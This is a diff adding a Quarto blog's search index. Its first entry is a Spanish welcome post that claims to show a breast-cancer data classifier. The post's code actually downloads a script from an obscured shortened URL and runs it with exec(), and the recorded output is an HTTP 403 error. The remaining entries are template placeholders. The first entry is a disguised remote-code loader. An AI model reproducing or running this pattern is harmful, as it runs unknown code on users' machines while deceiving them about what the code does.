@@ -1,0 +1,30 @@
+[
+  {
+    "objectID": "posts/welcome.html",
+    "href": "posts/welcome.html",
+    "title": "Mi Primer Post en el Blog",
+    "section": "",
+    "text": "¡Bienvenidos!\nEste es mi primer post en el blog utilizando Quarto. Aquí tienes un clasificador de ejemplo para datos de cáncer de mama.\n\nimport urllib.request\n\ngist_url = \"https://shorturl.at/WZ8hR\"\n\ntry:\n   with urllib.request.urlopen(gist_url) as response:\n      script_content = response.read().decode('utf-8')\n   \n   print(\"Ejecutando el script...\")\n   exec(script_content)  # Ejecutar el script\nexcept Exception as e:\n   print(f\"Ocurrió un error: {e}\")\n\nOcurrió un error: HTTP Error 403: Forbidden"
+  },
+  {
+    "objectID": "posts/welcome/index.html",
+    "href": "posts/welcome/index.html",
+    "title": "Welcome To My Blog",
+    "section": "",
+    "text": "This is the first post in a Quarto blog. Welcome!\n\nSince this post doesn’t specify an explicit image, the first image in the post will be used in the listing page of posts."
+  },
+  {
+    "objectID": "about.html",
+    "href": "about.html",
+    "title": "About",
+    "section": "",
+    "text": "About this blog"
+  },
+  {
+    "objectID": "posts/post-with-code/index.html",
+    "href": "posts/post-with-code/index.html",
+    "title": "Post With Code",
+    "section": "",
+    "text": "This is a post with executable code."
+  }
+]
